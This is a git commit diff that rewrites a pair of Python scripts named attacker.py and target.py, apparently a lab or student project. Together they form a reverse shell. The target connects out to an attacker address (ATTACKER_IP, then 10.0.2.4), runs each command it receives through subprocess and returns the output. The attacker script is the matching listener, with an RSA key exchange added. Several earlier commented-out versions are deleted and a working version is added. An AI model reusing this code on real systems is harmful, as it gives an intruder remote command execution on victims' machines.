941f7c5f168ec60228ec10a739a73754c218cdaa
DhruvArora-03 <dhruvarora@utexas.edu>
2024-03-03 19:44:27 -0600

    delete unused files

--- attacker.py
+++ attacker.py
@@ -1,111 +1,5 @@
-# import socket
-# import subprocess
-
-# HOST = '0.0.0.0'  # Listen on all network interfaces
-# PORT = 12345  # Choose a port number
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.bind((HOST, PORT))
-# s.listen(1)
-# print(f"Listening on {HOST}:{PORT}")
-# conn, addr = s.accept()
-# print(f"Connection from {addr}")
-
-# while True:
-#     command = input("Enter command to execute or 'exit' to quit: ")
-#     if command.lower() == 'exit':
-#         conn.send(b'exit')
-#         conn.close()
-#         break
-#     conn.send(command.encode())
-#     output = conn.recv(1024)
-#     print(output.decode(), end="")
-# s.close()
-
-# from cryptography.hazmat.primitives import serialization
-# from cryptography.hazmat.backends import default_backend
-# from cryptography.hazmat.primitives import hashes
-# from cryptography.hazmat.primitives.asymmetric import padding
-
-# import socket
-# import subprocess
-
-# def load_private_key():
-#     with open("private_key.pem", "rb") as key_file:
-#         private_key = serialization.load_pem_private_key(
-#             key_file.read(),
-#             password=None,
-#             backend=default_backend()
-#         )
-#     return private_key
-
-# def decrypt_message(encrypted, private_key):
-#     decrypted = private_key.decrypt(
-#         encrypted,
-#         padding.OAEP(
-#             mgf=padding.MGF1(algorithm=hashes.SHA256()),
-#             algorithm=hashes.SHA256(),
-#             label=None
-#         )
-#     )
-#     return decrypted.decode()
-
-# HOST = '10.0.2.6' # Listen on all network interfaces
-# PORT = 12345  # Choose a port number
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.bind((HOST, PORT))
-# s.listen(1)
-# print(f"Listening on {HOST}:{PORT}")
-# conn, addr = s.accept()
-# print(f"Connection from {addr}")
-
-# private_key = load_private_key()
-
-# while True:
-#     command = input("Enter command to execute or 'exit' to quit: ")
-#     if command.lower() == 'exit':
-#         conn.send(b'exit')
-#         conn.close()
-#         break
-#     conn.send(command.encode())
-#     encrypted_output = conn.recv(1024)
-#     output = decrypt_message(encrypted_output, private_key)
-#     print(output, end="")
-# s.close()
-
-
-# from cryptidy import asymmetric_encryption
-# import socket
-# import subprocess
-
-# HOST = '10.0.2.4' # Listen on all network interfaces
-# PORT = 12345  # Choose a port number
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.bind((HOST, PORT))
-# s.listen(1)
-# print(f"Listening on {HOST}:{PORT}")
-# conn, addr = s.accept()
-# print(f"Connection from {addr}")
-
-# priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
-
-# while True:
-#     command = input("Enter command to execute or 'exit' to quit: ")
-#     if command.lower() == 'exit':
-#         conn.send(b'exit')
-#         conn.close()
-#         break
-#     conn.send(command.encode())
-#     encrypted_output = conn.recv(1024)
-#     output = asymmetric_encryption.decrypt_message(encrypted_output, priv_key)
-#     print(output, end="")
-# s.close()
-
-
-# updated 
-from cryptidy import asymmetric_encryption
 import socket
-import subprocess
-import base64
+from cryptidy import asymmetric_encryption
 
 HOST = '10.0.2.4' # Listen on all network interfaces
 PORT = 12345  # Choose a port number
@@ -117,16 +11,22 @@ conn, addr = s.accept()
 print(f"Connection from {addr}")
 
 priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
+print(f'attacker priv key: {priv_key}')
+print(f'attacker pub key: {pub_key}')
+conn.send(pub_key.encode())
+
+target_pub_key = conn.recv(1024).decode()
+print(f'target pub key: {target_pub_key}')
 
 while True:
     command = input("Enter command to execute or 'exit' to quit: ")
     if command.lower() == 'exit':
-        conn.send(b'exit')
+        conn.send('exit'.encode())
         conn.close()
         break
     conn.send(command.encode())
-    encrypted_output_b64 = conn.recv(1024)
-    encrypted_output = base64.b64decode(encrypted_output_b64)
-    output = asymmetric_encryption.decrypt_message(encrypted_output, priv_key)
+    output = conn.recv(1024).decode()
+    # encrypted_output = conn.recv(1024).decode()
+    # output = asymmetric_encryption.decrypt_message(encrypted_output, priv_key)
     print(output, end="")
 s.close()
--- target.py
+++ target.py
@@ -1,123 +1,8 @@
-# # from cryptidy import asymmetric_encryption
-
-# # priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
-
-# # some_python_objects = ['foo', 'bar'], 'some long string', 12
-# # encrypted = asymmetric_encryption.encrypt_message(some_python_objects, pub_key)
-# # timestamp, original_object = asymmetric_encryption.decrypt_message(encrypted, priv_key) 
-
-# ################################################################################################3
-
-# import socket
-# import subprocess
-# import os
-
-# HOST = 'ATTACKER_IP'  # Attacker's IP address
-# PORT = 12345  # Same port number used in the listener
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.connect((HOST, PORT))
-
-# while True:
-#     data = s.recv(1024)
-#     if data[:2].decode('utf-8') == 'cd':
-#         os.chdir(data[3:].decode('utf-8'))
-#     if len(data) > 0:
-#         cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-#         output_bytes = cmd.stdout.read() + cmd.stderr.read()
-#         output_str = str(output_bytes)
-#         s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-#     else:
-#         s.send(str.encode(' '))
-# s.close()
-
-# from cryptography.hazmat.primitives import serialization
-# from cryptography.hazmat.primitives.asymmetric import rsa
-# from cryptography.hazmat.backends import default_backend
-# from cryptography.hazmat.primitives import hashes
-# from cryptography.hazmat.primitives.asymmetric import padding
-
-# import socket
-# import subprocess
-# import os
-
-# def generate_rsa_keys():
-#     private_key = rsa.generate_private_key(
-#         public_exponent=65537,
-#         key_size=2048,
-#         backend=default_backend()
-#     )
-#     public_key = private_key.public_key()
-#     return private_key, public_key
-
-# def encrypt_message(message, public_key):
-#     encrypted = public_key.encrypt(
-#         message.encode(),
-#         padding.OAEP(
-#             mgf=padding.MGF1(algorithm=hashes.SHA256()),
-#             algorithm=hashes.SHA256(),
-#             label=None
-#         )
-#     )
-#     return encrypted
-
-# def decrypt_message(encrypted, private_key):
-#     decrypted = private_key.decrypt(
-#         encrypted,
-#         padding.OAEP(
-#             mgf=padding.MGF1(algorithm=hashes.SHA256()),
-#             algorithm=hashes.SHA256(),
-#             label=None
-#         )
-#     )
-#     return decrypted.decode()
-
-# HOST = '10.0.2.4'  # Attacker's IP address
-# PORT = 12345  # Same port number used in the listener
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.connect((HOST, PORT))
-
-# private_key, public_key = generate_rsa_keys()
-
-# while True:
-#     data = s.recv(1024)
-#     if data[:2].decode('utf-8') == 'cd':
-#         os.chdir(data[3:].decode('utf-8'))
-#     if len(data) > 0:
-#         encrypted_data = encrypt_message(data.decode('utf-8'), public_key)
-#         s.send(encrypted_data)
-#     else:
-#         s.send(b' ')
-# s.close()
-
-# from cryptidy import asymmetric_encryption
-# import socket
-# import subprocess
-# import os
-
-# HOST = '10.0.2.4'  # Attacker's IP address
-# PORT = 12345  # Same port number used in the listener
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.connect((HOST, PORT))
-
-# priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
-
-# while True:
-#     data = s.recv(1024)
-#     if data[:2].decode('utf-8') == 'cd':
-#         os.chdir(data[3:].decode('utf-8'))
-#     if len(data) > 0:
-#         encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), pub_key)
-#         s.send(encrypted_data)
-#     else:
-#         s.send(b' ')
-# s.close()
-
-# updated code
-from cryptidy import asymmetric_encryption
+# pylint: disable=bare-except
 import socket
 import subprocess
 import os
-import base64
+from cryptidy import asymmetric_encryption
 
 HOST = '10.0.2.4'  # Attacker's IP address
 PORT = 12345  # Same port number used in the listener
@@ -125,15 +10,31 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
 priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
+print(f'target priv key: {priv_key}')
+print(f'target pub key: {pub_key}')
+s.send(pub_key.encode())
 
-while True:
-    data = s.recv(1024)
-    if data[:2].decode('utf-8') == 'cd':
-        os.chdir(data[3:].decode('utf-8'))
-    if len(data) > 0:
-        encrypted_data = asymmetric_encryption.encrypt_message(data.decode('utf-8'), pub_key)
-        encrypted_data_b64 = base64.b64encode(encrypted_data)
-        s.send(encrypted_data_b64)
-    else:
-        s.send(b' ')
-s.close()
+attacker_pub_key = s.recv(1024).decode()
+print(f'attacker pub key: {attacker_pub_key}')
+
+try:
+    while True:
+        attacker_input = s.recv(1024).decode().split(' ')
+        print(f"attacker_input: {attacker_input}")
+        if attacker_input == 'exit':
+            s.close()
+            break
+        
+        if attacker_input[0] == 'cd':
+            if len(attacker_input) != 2:
+                s.send('Please only use cd by itself with one argument. ex: "cd _____"')
+            else:
+                os.chdir(attacker_input[1])
+                s.send(b'\n')
+        elif len(attacker_input) > 0:
+            result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
+            s.send(result.stdout)
+        else:
+            s.send(b' ')
+except:
+    s.close()
